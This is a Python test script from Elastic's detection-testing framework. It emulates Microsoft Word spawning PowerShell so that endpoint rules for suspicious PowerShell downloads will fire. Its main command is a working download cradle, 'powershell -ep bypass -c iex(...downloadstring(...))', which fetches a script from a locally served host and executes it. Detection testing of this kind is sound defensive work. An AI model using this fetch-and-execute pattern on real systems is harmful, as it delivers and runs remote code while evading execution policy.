# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging
import time
from pathlib import Path

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="20b96aa7-609e-473f-ac35-5ac19d10f9a5",
    name="suspicious_powershell_download",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(
            id="93ef8a09-0f8d-4aa1-b0fb-47d5d5b40cf2", name="PowerShell Obfuscation Spawned via Microsoft Office"
        ),
        RuleMetadata(id="7200673e-588c-45d5-be48-bc5c7a908d6b", name="Suspicious PowerShell Downloads"),
    ],
    techniques=["T1566", "T1059"],
)
def main():
    EXE_FILE = _common.get_resource_path("bin/renamed.exe")

    _, ip, port = _common.serve_dir_over_http()
    url = "http://{}:{}/bad.ps1".format(ip, port)

    cmd = "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(url)

    # Emulate Word
    user_app = "winword.exe"
    log.info("Emulating {}".format(user_app))
    user_app_path = Path(user_app).resolve()
    _common.copy_file(EXE_FILE, user_app_path)

    _ = _common.execute_command([user_app_path, "/c", cmd])
    time.sleep(2)

    # Cleanup
    _common.remove_file(user_app_path)
